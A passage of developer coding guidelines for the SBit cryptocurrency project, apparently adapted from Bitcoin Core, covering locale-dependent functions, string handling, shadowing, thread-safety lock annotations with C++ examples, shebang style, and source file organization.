tend to act differently depending on platform, or even the user locale.</li></ul></li><li><p>Use <code>ParseInt32</code>, <code>ParseInt64</code>, <code>ParseUInt32</code>, <code>ParseUInt64</code>, <code>ParseDouble</code> from <code>utilstrencodings.h</code> for number parsing.</p><ul><li><em>Rationale</em>: These functions do overflow checking and avoid pesky locale issues.</li></ul></li><li><p>Avoid using locale dependent functions if possible. You can use the provided
<a href="https://github.com/SBit-Project/sbit/test/lint/lint-locale-dependence.sh" target="_blank" rel="noopener noreferrer"><code>lint-locale-dependence.sh</code></a>
to check for accidental use of locale dependent functions.</p><ul><li><p><em>Rationale</em>: Unnecessary locale dependence can cause bugs that are very tricky to isolate and fix.</p></li><li><p>These functions are known to be locale dependent:
<code>alphasort</code>, <code>asctime</code>, <code>asprintf</code>, <code>atof</code>, <code>atoi</code>, <code>atol</code>, <code>atoll</code>, <code>atoq</code>,
<code>btowc</code>, <code>ctime</code>, <code>dprintf</code>, <code>fgetwc</code>, <code>fgetws</code>, <code>fprintf</code>, <code>fputwc</code>,
<code>fputws</code>, <code>fscanf</code>, <code>fwprintf</code>, <code>getdate</code>, <code>getwc</code>, <code>getwchar</code>, <code>isalnum</code>,
<code>isalpha</code>, <code>isblank</code>, <code>iscntrl</code>, <code>isdigit</code>, <code>isgraph</code>, <code>islower</code>, <code>isprint</code>,
<code>ispunct</code>, <code>isspace</code>, <code>isupper</code>, <code>iswalnum</code>, <code>iswalpha</code>, <code>iswblank</code>,
<code>iswcntrl</code>, <code>iswctype</code>, <code>iswdigit</code>, <code>iswgraph</code>, <code>iswlower</code>, <code>iswprint</code>,
<code>iswpunct</code>, <code>iswspace</code>, <code>iswupper</code>, <code>iswxdigit</code>, <code>isxdigit</code>, <code>mblen</code>,
<code>mbrlen</code>, <code>mbrtowc</code>, <code>mbsinit</code>, <code>mbsnrtowcs</code>, <code>mbsrtowcs</code>, <code>mbstowcs</code>,
<code>mbtowc</code>, <code>mktime</code>, <code>putwc</code>, <code>putwchar</code>, <code>scanf</code>, <code>snprintf</code>, <code>sprintf</code>,
<code>sscanf</code>, <code>stoi</code>, <code>stol</code>, <code>stoll</code>, <code>strcasecmp</code>, <code>strcasestr</code>, <code>strcoll</code>,
<code>strfmon</code>, <code>strftime</code>, <code>strncasecmp</code>, <code>strptime</code>, <code>strtod</code>, <code>strtof</code>,
<code>strtoimax</code>, <code>strtol</code>, <code>strtold</code>, <code>strtoll</code>, <code>strtoq</code>, <code>strtoul</code>,
<code>strtoull</code>, <code>strtoumax</code>, <code>strtouq</code>, <code>strxfrm</code>, <code>swprintf</code>, <code>tolower</code>,
<code>toupper</code>, <code>towctrans</code>, <code>towlower</code>, <code>towupper</code>, <code>ungetwc</code>, <code>vasprintf</code>,
<code>vdprintf</code>, <code>versionsort</code>, <code>vfprintf</code>, <code>vfscanf</code>, <code>vfwprintf</code>, <code>vprintf</code>,
<code>vscanf</code>, <code>vsnprintf</code>, <code>vsprintf</code>, <code>vsscanf</code>, <code>vswprintf</code>, <code>vwprintf</code>,
<code>wcrtomb</code>, <code>wcscasecmp</code>, <code>wcscoll</code>, <code>wcsftime</code>, <code>wcsncasecmp</code>, <code>wcsnrtombs</code>,
<code>wcsrtombs</code>, <code>wcstod</code>, <code>wcstof</code>, <code>wcstoimax</code>, <code>wcstol</code>, <code>wcstold</code>,
<code>wcstoll</code>, <code>wcstombs</code>, <code>wcstoul</code>, <code>wcstoull</code>, <code>wcstoumax</code>, <code>wcswidth</code>,
<code>wcsxfrm</code>, <code>wctob</code>, <code>wctomb</code>, <code>wctrans</code>, <code>wctype</code>, <code>wcwidth</code>, <code>wprintf</code></p></li></ul></li><li><p>For <code>strprintf</code>, <code>LogPrint</code>, <code>LogPrintf</code> formatting characters don&#x27;t need size specifiers.</p><ul><li><em>Rationale</em>: Bitcoin Core uses tinyformat, which is type safe. Leave them out to avoid confusion.</li></ul></li><li><p>Use <code>.c_str()</code> sparingly. Its only valid use is to pass C++ strings to C functions that take NULL-terminated
strings.</p><ul><li><p>Do not use it when passing a sized array (so along with <code>.size()</code>). Use <code>.data()</code> instead to get a pointer
to the raw data.</p><ul><li><em>Rationale</em>: Although this is guaranteed to be safe starting with C++11, <code>.data()</code> communicates the intent better.</li></ul></li><li><p>Do not use it when passing strings to <code>tfm::format</code>, <code>strprintf</code>, <code>LogPrint[f]</code>.</p><ul><li><em>Rationale</em>: This is redundant. Tinyformat handles strings.</li></ul></li><li><p>Do not use it to convert to <code>QString</code>. Use <code>QString::fromStdString()</code>.</p><ul><li><em>Rationale</em>: Qt has built-in functionality for converting their string
type from/to C++. No need to roll your own.</li></ul></li><li><p>In cases where do you call <code>.c_str()</code>, you might want to additionally check that the string does not contain embedded &#x27;\0&#x27; characters, because
it will (necessarily) truncate the string. This might be used to hide parts of the string from logging or to circumvent
checks. If a use of strings is sensitive to this, take care to check the string for embedded NULL characters first
and reject it if there are any (see <code>ParsePrechecks</code> in <code>strencodings.cpp</code> for an example).</p></li></ul></li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="shadowing">Shadowing<a class="hash-link" href="#shadowing" title="Direct link to heading">​</a></h2><p>Although the shadowing warning (<code>-Wshadow</code>) is not enabled by default (it prevents issues arising
from using a different variable with the same name),
please name variables so that their names do not shadow variables defined in the source code.</p><p>When using nested cycles, do not name the inner cycle variable the same as in
the upper cycle, etc.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="threads-and-synchronization">Threads and synchronization<a class="hash-link" href="#threads-and-synchronization" title="Direct link to heading">​</a></h2><ul><li><p>Prefer <code>Mutex</code> type to <code>RecursiveMutex</code> one</p></li><li><p>Consistently use <a href="https://clang.llvm.org/docs/ThreadSafetyAnalysis.html" target="_blank" rel="noopener noreferrer">Clang Thread Safety Analysis</a> annotations to
get compile-time warnings about potential race conditions in code. Combine annotations in function declarations with
run-time asserts in function definitions:</p></li></ul><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">// txmempool.h</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">class</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(78, 201, 176)">CTxMemPool</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">public</span><span class="token operator" style="color:rgb(212, 212, 212)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token keyword" style="color:rgb(86, 156, 214)">mutable</span><span class="token plain"> RecursiveMutex cs</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token keyword" style="color:rgb(86, 156, 214)">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">UpdateTransactionsFromBlock</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">EXCLUSIVE_LOCKS_REQUIRED</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">cs_main</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> cs</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// txmempool.cpp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">void</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(78, 201, 176)">CTxMemPool</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token function" style="color:rgb(220, 220, 170)">UpdateTransactionsFromBlock</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token function" style="color:rgb(220, 220, 170)">AssertLockHeld</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">cs_main</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token function" style="color:rgb(220, 220, 170)">AssertLockHeld</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">cs</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">// validation.h</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">class</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(78, 201, 176)">ChainstateManager</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">public</span><span class="token operator" style="color:rgb(212, 212, 212)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">ProcessNewBlock</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">EXCLUSIVE_LOCKS_REQUIRED</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token operator" style="color:rgb(212, 212, 212)">!</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">cs_main</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// validation.cpp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(78, 201, 176)">ChainstateManager</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token function" style="color:rgb(220, 220, 170)">ProcessNewBlock</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token function" style="color:rgb(220, 220, 170)">AssertLockNotHeld</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">cs_main</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token function" style="color:rgb(220, 220, 170)">LOCK</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">cs_main</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><ul><li><p>Build and run tests with <code>-DDEBUG_LOCKORDER</code> to verify that no potential
deadlocks are introduced. As of 0.12, this is defined by default when
configuring with <code>--enable-debug</code>.</p></li><li><p>When using <code>LOCK</code>/<code>TRY_LOCK</code> be aware that the lock exists in the context of
the current scope, so surround the statement and the code that needs the lock
with braces.</p></li></ul><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>OK</h5></div><div class="admonition-content"><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token function" style="color:rgb(220, 220, 170)">TRY_LOCK</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">cs_vNodes</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> lockNodes</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><div class="admonition admonition-danger alert alert--danger"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>Wrong</h5></div><div class="admonition-content"><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token function" style="color:rgb(220, 220, 170)">TRY_LOCK</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">cs_vNodes</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> lockNodes</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="scripts">Scripts<a class="hash-link" href="#scripts" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="shebang">Shebang<a class="hash-link" href="#shebang" title="Direct link to heading">​</a></h3><ul><li><p>Use <code>#!/usr/bin/env bash</code> instead of obsolete <code>#!/bin/bash</code>.</p><ul><li><p><a href="https://github.com/dylanaraps/pure-bash-bible#shebang" target="_blank" rel="noopener noreferrer"><em>Rationale</em></a>:</p><p><code>#!/bin/bash</code> assumes it is always installed to /bin/ which can cause issues;</p><p><code>#!/usr/bin/env bash</code> searches the user&#x27;s PATH to find the bash binary.</p></li></ul></li></ul><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>OK</h5></div><div class="admonition-content"><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token shebang important">#!/usr/bin/env bash</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><div class="admonition admonition-danger alert alert--danger"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>Wrong</h5></div><div class="admonition-content"><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token shebang important">#!/bin/bash</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="source-code-organization">Source code organization<a class="hash-link" href="#source-code-organization" title="Direct link to heading">​</a></h2><ul><li><p>Implementation code should go into the <code>.cpp</code> file and not the <code>.h</code>, unless necessary due to template usage or
when performance due to inlining is critical.</p><ul><li><em>Rationale</em>: Shorter and simpler header files are easier to read and reduce compile time.</li></ul></li><li><p>Use only the lowercase alphanumerics (<code>a-z0-9</code>), underscore (<code>_</code>) and hyphen (<code>-</code>) in source code filenames.</p><ul><li><em>Rationale</em>: <code>grep</code>:ing and auto-completing filenames is easier when using a consistent
naming pattern. Potential problems when building on case-insensitive filesystems are
avoided when using only lowercase characters in source code filenames.</li></ul></li><li><p>Every <code>.cpp</code> and <code>.h</code> file should <code>#include</code> every header file it directly uses classes, functions or other
definitions from, even if those headers are already included indirectly through other headers.</p><ul><li><em>Rationale</em>: Excluding headers because they are already indirectly included results in compilation
failures when those indirect dependencies change. Furthermore, it obscures what the real code
dependencies are.</li></ul></li><li><p>Don&#x27;t import anything into the global namespace (<code>using namespace ...</code>). Use
fully specified types such as <code>std::string</code>.</p><ul><li><em>Rationale</em>: Avoids symbol conflicts.</li></ul></li><li><p>Terminate namespaces with a comment (<code>// namespace mynamespace</code>). The comment
